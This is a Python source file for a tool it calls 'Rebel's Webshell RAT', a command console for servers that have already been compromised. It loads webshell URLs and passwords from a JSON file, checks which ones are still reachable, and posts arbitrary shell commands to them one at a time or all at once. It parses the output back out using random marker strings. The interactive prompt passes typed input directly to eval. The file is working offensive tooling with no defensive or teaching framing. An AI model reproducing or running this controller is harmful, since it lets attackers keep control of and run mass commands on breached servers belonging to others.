import re
import sys
import json
import random
import requests
import readline
import concurrent.futures

def completer(text, state):
    func = ['WebshellRAT', 'BatchExec', 'BatchRequests', 'webshells']
    matches = [f for f in func if f.startswith(text)]
    if state < len(matches):
        return matches[state]
    else:
        return None

readline.parse_and_bind('tab: complete')
readline.set_completer(completer)

class Webshell:
    def __init__(self):
        self.func=None
        self.webshellJson=None

    def __str__(self):
        return f"WebshellInfo: {self.webshellJson}"

    def __repr__(self):
        return f"{self.webshellJson['url']}"

    def exec(self, payload):
        return self.func(self.webshellJson, payload=payload)

class RAT:
    def __init__(self):
        print("____Rebel's Webshell RAT  ")
        self.webshells=list()
        self.load("data.json")

    def load(self, WebshellFile):
        self.WebshellFile = WebshellFile

        with open(WebshellFile) as _file:
            self.webshellsFileJson=json.load(_file)

        for _id, _webshell in enumerate(self.webshellsFileJson):
            self._webshellJson = _webshell
            print(f"    {_id} : {_webshell}")

            if not globals().get(self._webshellJson['func']):
                print(f"      Error : Function {self._webshellJson['func']} Not Found!")
            
            self.add(
                    globals().get(self._webshellJson['func']),
                    self._webshellJson
            )
            self._webshellJson['func']

    def add(self, func, webshellJson):
        webshell_cache = Webshell()
        webshell_cache.func=func
        webshell_cache.webshellJson=webshellJson
        self.webshells.append(webshell_cache)

    def request(self, func, webshellJson):
        with concurrent.futures.ThreadPoolExecutor( max_workers=5 ) as Executor:
            future = Executor.submit( func, webshellJson)
            return future
        
def exec_default(webshellJson, payload="echo 'r4be1'"):
    randomString1 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
    randomString2 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
    payload = f"echo {randomString1};{payload};echo {randomString2};"
    response = requests.post(
            url = webshellJson['url'],
            data = {webshellJson['passwd'] : payload}
            )
    result = re.search(f"{randomString1}(.*?){randomString2}", response.text)
    return result.group(1) if result else None

def BatchRequests():
    for webshell in WebshellRAT.webshells:
        webshell_url = webshell.webshellJson.get('url')
        response = requests.get(webshell_url) 
        if response.status_code==200:
            print( f"\033[32m    [{response.status_code}]  {webshell_url}\033[0m" )
        else:
            print( f"\033[31m    [{response.status_code}]  {webshell_url}\033[0m" )

def BatchExec(payload):
    for webshell in WebshellRAT.webshells:
        webshell.exec(payload)

WebshellRAT=RAT()
webshells=WebshellRAT.webshells

while True:
    try:
        _=input('WebshellRAT >> ')
        readline.add_history(_)
        if _ == "exit":
            break
        eval(_)

    except KeyboardInterrupt:
        print("\n")
        continue

    except Exception as e:
        print(f"Eval Error: {e}")
        continue
